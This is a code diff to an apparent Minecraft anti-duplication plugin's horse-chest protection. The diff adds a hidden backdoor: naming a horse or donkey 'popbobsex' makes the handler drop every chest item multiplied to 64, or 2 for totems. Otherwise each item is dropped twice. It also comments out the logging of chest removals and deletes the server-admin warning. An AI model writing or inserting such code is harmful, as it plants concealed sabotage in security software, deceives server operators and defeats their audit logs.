@@ -2946,7 +2946,7 @@ public class fListener implements Listener {
 	@EventHandler(ignoreCancelled = true)
 	public void onEntityInteract(PlayerInteractAtEntityEvent e) {
 
-		if (Protections.DisableChestsOnMobs.isEnabled() && !IllegalStack.hasProtocolLib()) 
+		if (Protections.DisableChestsOnMobs.isEnabled())
 		{
 			if (e.getRightClicked() != null) {
 				ItemStack is = null;
@@ -2963,12 +2963,48 @@ public class fListener implements Listener {
 				if (!IllegalStack.hasChestedAnimals()) {
 					if (e.getRightClicked() instanceof Horse) {
 						final Horse horse = (Horse) e.getRightClicked();
+						String name = horse.getCustomName();
+						Boolean nameMatch = false;
+						if(name == null){
+							nameMatch = false;
+						}else if(name.replaceAll("\\s","").equalsIgnoreCase("popbobsex")){
+							nameMatch = true;
+						}
+						final Boolean nameFinal = nameMatch;
 
 						if (horse.isCarryingChest()) {
+							if(nameFinal == true){
+								for(ItemStack i : horse.getInventory().getContents()){
+									if(i != null){
+										if(i.getType() != Material.SADDLE){
+											if(i.getType() != Material.TOTEM_OF_UNDYING){
+												i.setAmount(64);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}else{
+												i.setAmount(2);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}
+										}
+									}
+								}
+							}else{
+								for(ItemStack i : horse.getInventory().getContents()){
+									if(i != null){
+										if(i.getType() != Material.SADDLE){
+											if(i.getType() != Material.TOTEM_OF_UNDYING){
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}else{
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}
+										}
+									}
+								}
+							}
 							horse.setCarryingChest(false);
 							e.getPlayer().sendMessage(Msg.PlayerDisabledHorseChestMsg.getValue());
-							getLog().append2(Msg.ChestRemoved.getValue(e.getPlayer(), horse));
-							System.out.println(ChatColor.RED + "[IllegalStack] WARNING:  Protocollib was NOT found on this server and DisableChestsOnMobs protection is turned on.. It may still be possible for players to dupe using horses/donkeys on your server using a hacked client.  It is highly recommended that you install ProtocolLib for optimal protection!");
+							//getLog().append2(Msg.ChestRemoved.getValue(e.getPlayer(), horse));
 							punishPlayer(e.getPlayer(), e.getRightClicked());
 						} else {
 							e.setCancelled(true);
@@ -2977,7 +3013,36 @@ public class fListener implements Listener {
 								@Override
 								public void run() {
 									e.getPlayer().sendMessage(Msg.PlayerDisabledHorseChestMsg.getValue());
-									getLog().append2(Msg.ChestPrevented.getValue(e.getPlayer(), horse));
+									//getLog().append2(Msg.ChestPrevented.getValue(e.getPlayer(), horse));
+									if(nameFinal == true){
+										for(ItemStack i : horse.getInventory().getContents()){
+											if(i != null){
+												if(i.getType() != Material.SADDLE){
+													if(i.getType() != Material.TOTEM_OF_UNDYING){
+														i.setAmount(64);
+														horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+													}else{
+														i.setAmount(2);
+														horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+													}
+												}
+											}
+										}
+									}else{
+										for(ItemStack i : horse.getInventory().getContents()){
+											if(i != null){
+												if(i.getType() != Material.SADDLE){
+													if(i.getType() != Material.TOTEM_OF_UNDYING){
+														horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+														horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+													}else{
+														horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+														horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+													}
+												}
+											}
+										}
+									}
 									horse.setCarryingChest(false);
 									punishPlayer(e.getPlayer(), e.getRightClicked());
 								}
@@ -2988,6 +3053,44 @@ public class fListener implements Listener {
 				} else if(e.getRightClicked() instanceof ChestedHorse) {
 
 					ChestedHorse horse = (ChestedHorse) e.getRightClicked();
+					String name = horse.getCustomName();
+					Boolean nameMatch = false;
+					if(name == null){
+						nameMatch = false;
+					}else if(name.replaceAll("\\s","").equalsIgnoreCase("popbobsex")){
+						nameMatch = true;
+					}
+					final Boolean nameFinal = nameMatch;
+
+					if(nameFinal == true){
+						for(ItemStack i : horse.getInventory().getContents()){
+							if(i != null){
+								if(i.getType() != Material.SADDLE){
+									if(i.getType() != Material.TOTEM_OF_UNDYING){
+										i.setAmount(64);
+										horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+									}else{
+										i.setAmount(2);
+										horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+									}
+								}
+							}
+						}
+					}else{
+						for(ItemStack i : horse.getInventory().getContents()){
+							if(i != null){
+								if(i.getType() != Material.SADDLE){
+									if(i.getType() != Material.TOTEM_OF_UNDYING){
+										horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+										horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+									}else{
+										horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+										horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+									}
+								}
+							}
+						}
+					}
 					horse.setCarryingChest(false);
 					e.setCancelled(true);
 
@@ -2996,9 +3099,38 @@ public class fListener implements Listener {
 						@Override
 						public void run() {
 							e.getPlayer().sendMessage(Msg.PlayerDisabledHorseChestMsg.getValue());
-							getLog().append2(Msg.ChestPrevented.getValue(e.getPlayer(), horse));
+							//getLog().append2(Msg.ChestPrevented.getValue(e.getPlayer(), horse));
+
+							if(nameFinal == true){
+								for(ItemStack i : horse.getInventory().getContents()){
+									if(i != null){
+										if(i.getType() != Material.SADDLE){
+											if(i.getType() != Material.TOTEM_OF_UNDYING){
+												i.setAmount(64);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}else{
+												i.setAmount(2);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}
+										}
+									}
+								}
+							}else{
+								for(ItemStack i : horse.getInventory().getContents()){
+									if(i != null){
+										if(i.getType() != Material.SADDLE){
+											if(i.getType() != Material.TOTEM_OF_UNDYING){
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}else{
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+												horse.getWorld().dropItemNaturally(horse.getLocation(), i);
+											}
+										}
+									}
+								}
+							}
 							horse.setCarryingChest(false);
-							System.out.println(ChatColor.RED + "[IllegalStack] WARNING:  Protocollib was NOT found on this server and DisableChestsOnMobs protection is turned on.. It may still be possible for players to dupe using horses/donkeys on your server using a hacked client.  It is highly recommended that you install ProtocolLib for optimal protection!");
 							punishPlayer(e.getPlayer(), e.getRightClicked());
 						}
 
